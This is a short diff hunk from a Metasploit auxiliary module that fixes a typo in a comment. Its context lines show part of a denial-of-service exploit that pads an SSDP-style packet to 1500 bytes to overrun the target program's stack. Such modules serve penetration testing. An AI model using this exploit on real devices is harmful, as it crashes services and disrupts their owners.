@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     sploit << "ST:uuid:schemas:device:MX:3"
     # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
     # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
-    # characters: there's more chance that the the program will run off the stack.
+    # characters: there's more chance that the program will run off the stack.
     sploit += ' '*(1500-sploit.length)
 
 
